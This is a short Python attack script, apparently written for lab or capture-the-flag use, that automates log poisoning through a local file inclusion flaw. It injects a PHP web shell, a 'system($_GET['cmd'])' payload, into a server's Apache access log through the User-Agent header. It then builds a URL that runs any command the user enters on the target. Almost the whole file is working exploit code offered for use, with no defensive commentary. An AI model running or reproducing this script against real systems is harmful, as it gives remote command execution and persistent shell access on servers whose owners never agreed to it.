#!/usr/bin/python3
import requests
import urllib.parse

print("                                                       /%")                   
print("                                                     *&&@@&#")                  
print("                                                    @@@@@@@@@&")                
print("                                                   @@&&@%   @@&@")              
print("                                                   &&&@@      %@@")             
print("                  /%&@@@                           &@@&        &&.")            
print("                  @@@&@@@@                        &@@@&         @@")            
print("                  @&&,&@&@@@     . ,             &@&@@%          &*")           
print("                   &@/. ,@@@&&@@&&&%%@&&&%&#&&# &@@@@@(          &%")           
print("                   .&@    (&&@@@&&&&@&%&&@%%&&&@&&@@@&@  ,")                    
print("                     &&    (&@@&&&&&%&&&&&&&@&&&&@@@&&&*,..         /.")        
print("     #@@@@@&&@@@#(((%@@@@&@&&@&&%&&&&@@&&&%&@&@&&&&&&@&@&       @&@@@%@@@&%")   
print(" &&@&@@@@@@@@@@@@@@&@@&@@@@@@@&&%&@&%@@%&&&@&&&@&@@@@&@@&&@@@@&@@@@@&(((//%")   
print("/(/(//@@@&@@@@&@&@@@@@@@&@&@@@&&&&@%&&&%&&%@&&%@&&@%@&@&@@@@@@@@@@@@@@&&(&")    
print(" @&%&@@@.                 /&&&&@&%&@@&%%&@&&&%&&@&%%%#@&@&@@&.    (&@@@@&")     
print("   &@@@@@&                  .#. @%&&% .@&  %(  ,@%%&%#(%         &@@&@@&*")     
print("    *@@@@@@                      &&&   &&  &       (#/          @@@&@@.")       
print("      &&@@@@@                     ,%(                          ,@@&@&")         
print("        &&&&&@                                                .@@&&@")          
print("          &&@&@.                     endeav0r                 &&&&")           
print("            @@@&@@@@@&&                                       &&@@")            
print("              %%@&@&&@%(                                     @@%.")             
print("                     ,                                     &@&,")               
print("                                                             %&") 
print("	                 					    ")
                                                               
url = input('[+] Enter the full url with the log file - i.e. http://10.10.10.10/site/index.php?page=/xampp/apache/logs/access.log\n URL: ')
print(url)


headers = {
    'User-Agent': 'User-Agent: Mozilla/5.0 <?php system($_GET[\'cmd\']); ?> Safari/537.36'
}

print("[+] Poisoning...")
response = requests.get(url, headers=headers)


print(response)
print("[+] Log file poisoned!")

newHeaders = {
    'User-Agent': 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
}

cmd=input("Enter a command:")
print(f" You entered: {cmd}")
commandPath=urllib.parse.quote(cmd)
fullcmd=f"&cmd={commandPath}"
print("[+] Try the path below to get the output output of your command. It is best to view in source-code:\n")
print(url+fullcmd)
